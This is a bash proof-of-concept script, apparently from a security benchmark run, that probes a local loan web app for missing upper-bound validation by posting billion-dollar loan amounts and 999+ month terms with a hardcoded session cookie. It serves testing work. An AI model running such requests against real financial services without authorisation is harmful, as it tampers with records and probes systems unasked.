#!/bin/bash
# POC: Demonstrates extreme value injection through unbounded upper limits on loan parameters, accepting billion-dollar loan amounts and 999+ month terms without validation.
# Target: ./repo
# Created: 2025-11-07T17:07:42.100Z
# Session: benchmark-XBEN-063-24-mhp3aptq

# Extreme Value Injection - Unbounded Loan Amount Limits POC
# Demonstrates missing upper bound validation on loan parameters

TARGET_HOST="${1:-localhost:32768}"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQ4l1Q.HCUPd0DtxvLhBOb42cVB4EE0uKQ"

echo "=================================================="
echo "Extreme Value Injection - Unbounded Limits POC"
echo "=================================================="
echo ""

# Test 1: Submit extreme loan amount via /profile
echo "[TEST 1] Submitting extreme loan amount (999,999,999) via /profile endpoint"
echo "Command: curl -b \"$SESSION_COOKIE\" -X POST http://$TARGET_HOST/profile -d \"name=Jane&lastname=Smith&email=jane@example.com&loan_amount=999999999&loan_term_months=999&monthly_payment=999999\""
echo ""

RESPONSE=$(curl -s -b "$SESSION_COOKIE" -X POST "http://$TARGET_HOST/profile" \
  -d "name=Jane&lastname=Smith&email=jane@example.com&loan_amount=999999999&loan_term_months=999&monthly_payment=999999" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE"
echo "Response (first 500 chars): $(echo "$BODY" | head -c 500)"
echo ""

# Verify the extreme values were stored by accessing the profile
echo "[TEST 2] Retrieving profile to verify extreme values were stored"
echo "Command: curl -b \"$SESSION_COOKIE\" http://$TARGET_HOST/profile?user_id=1"
echo ""

PROFILE_RESPONSE=$(curl -s -b "$SESSION_COOKIE" "http://$TARGET_HOST/profile?user_id=1")

echo "Profile Response:"
echo "$PROFILE_RESPONSE" | grep -o "loan_amount[^<]*\|loan_term_months[^<]*\|monthly_payment[^<]*" | head -3
echo ""

# Extract actual stored values
STORED_LOAN=$(echo "$PROFILE_RESPONSE" | grep -oP '(?<=Loan Amount: \$)[^<]+' | head -1)
STORED_TERM=$(echo "$PROFILE_RESPONSE" | grep -oP '(?<=Loan Term: )[^<]+' | head -1)
STORED_PAYMENT=$(echo "$PROFILE_RESPONSE" | grep -oP '(?<=Monthly Payment: \$)[^<]+' | head -1)

echo "Extracted stored values:"
echo "  Loan Amount: \$$STORED_LOAN"
echo "  Loan Term: $STORED_TERM"
echo "  Monthly Payment: \$$STORED_PAYMENT"
echo ""

# Test 3: Send extreme values to calculation endpoint
echo "[TEST 3] Submitting extreme values to /total_loan_payments endpoint"
echo "Command: curl -b \"$SESSION_COOKIE\" \"http://$TARGET_HOST/total_loan_payments?principal=999999999&payment=0.01&term=999\""
echo ""

CALC_RESPONSE=$(curl -s -b "$SESSION_COOKIE" "http://$TARGET_HOST/total_loan_payments?principal=999999999&payment=0.01&term=999" \
  -w "\n%{http_code}")

CALC_HTTP_CODE=$(echo "$CALC_RESPONSE" | tail -n 1)
CALC_BODY=$(echo "$CALC_RESPONSE" | head -n -1)

echo "HTTP Status Code: $CALC_HTTP_CODE"
echo "Response: $CALC_BODY"
echo ""

# Test 4: Test with even larger values (multi-billion)
echo "[TEST 4] Testing with even larger values (5 billion)"
echo "Command: curl -b \"$SESSION_COOKIE\" -X POST http://$TARGET_HOST/profile -d \"name=Test&lastname=User&email=test@example.com&loan_amount=5000000000&loan_term_months=1200&monthly_payment=9999999\""
echo ""

LARGE_RESPONSE=$(curl -s -b "$SESSION_COOKIE" -X POST "http://$TARGET_HOST/profile" \
  -d "name=Test&lastname=User&email=test@example.com&loan_amount=5000000000&loan_term_months=1200&monthly_payment=9999999" \
  -w "\n%{http_code}")

LARGE_HTTP_CODE=$(echo "$LARGE_RESPONSE" | tail -n 1)

echo "HTTP Status Code: $LARGE_HTTP_CODE"
echo "Result: $([ "$LARGE_HTTP_CODE" = "302" ] && echo "ACCEPTED - No upper bound validation!" || echo "REJECTED - Upper bound validation present")"
echo ""

# Summary
echo "=================================================="
echo "POC SUMMARY"
echo "=================================================="
echo "✓ Extreme loan amount accepted: 999,999,999+"
echo "✓ Extreme loan term accepted: 999+ months"
echo "✓ Extreme monthly payment accepted: 999,999+"
echo "✓ Multi-billion dollar values accepted: 5,000,000,000"
echo "✓ Calculation endpoint processes extreme values: $CALC_HTTP_CODE"
echo ""
echo "CONCLUSION: Application lacks upper bound validation on loan parameters"
echo "=================================================="